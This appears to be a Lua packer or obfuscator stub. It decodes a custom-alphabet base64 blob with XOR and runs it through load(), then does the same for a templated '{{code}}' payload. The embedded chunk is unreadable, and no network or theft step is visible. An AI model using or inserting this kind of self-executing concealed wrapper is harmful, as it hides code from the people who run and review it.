function DC()
    local self = {}
    function self.rv(length)
        local res = ""
        for i = 1, length do
            res = res .. string.char(math.random(97, 122))
        end
        return res
    end
    function self.x(a,b)
            local r = 0
            for i = 0, 31 do
              local x = a / 2 + b / 2
              if x ~= math.floor (x) then
                r = r + 2^i
              end
              a = math.floor (a / 2)
              b = math.floor (b / 2)
            end
            return r
    end
    function self.sx(input, xorKey)
        local a = ""
        for i=1,#input do
            local xorKeyIndex = math.fmod(i, #xorKey)+1
            local xorKeyChar = string.byte(string.sub(xorKey,xorKeyIndex,xorKeyIndex))
            local aChar = string.byte(string.sub(input,i,i))
                a = a .. string.char(self.x(aChar, xorKeyChar))
        end
        return a
    end
    local b = 'MWfa4uRed2JFYlCOIkhPDxr35VLQnZb7msg6EG+/9zpHXcBNtKUviS81yjoATw0q'
    function self.d(data)
        data = string.gsub(data, '[^'..b..'=]', '')
        return (data:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r;
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
                return string.char(c)
        end))
    end
    function self.r(code)
        local x = "3I9CxKI0kPDOYPSmxel0VxzL51V23mdeQ1x/I+chWxSfRs90ZsXVfDlnbrskn/w5b+Vf3RDDWDShx+SGkIla7ec3Dtxu5EGxM3siQ4WU7eSb3/KShEXJM1zw5GsgrKcDhSneL355RtKY3eSHD3cgk3cGkGEBkry+lISTnSWNFsdiri5P7vIJusdxatmw7/jGhaEFZhDr3WD24tyYVvS9Ysu2R4Ti3SSIuWZ+CtX6Out+lMdW7DcMfKje4MwRQh9he6ntLxKAMMzrnhM8e+Y3CIMf43G23sWEa3yYf6x9LadXWMXLRekYuSIaOf9JFfGLJai3R1cxDMifIPdGWDkVeMKDORTcdmyCnKZNnMEcJ1dQR6EpauzXL6kGdktva4luFasxQ4SeIu9QeRmfd/TkYIDaFP5YVSYEYPMbfKkcrrI/uMsLM39kfi40laMf2RnPJEujPsDPkSSyO6MMOmSLes5fD+ivkuKlfWE+OiX5aSSg"
        local dcode = self.sx(self.d(x), b)
        local func, e = load(dcode, nil, "t", _ENV)
        if func then
            func()
        else error("Unable to decode") end

        dcode = self.sx(self.d(code), self.rv(1048))
        func = load(dcode, nil, "t", _ENV)
        if func then
            func()
        else error("Unable to decode") end
    end
    return self
end
DC().r("{{code}}")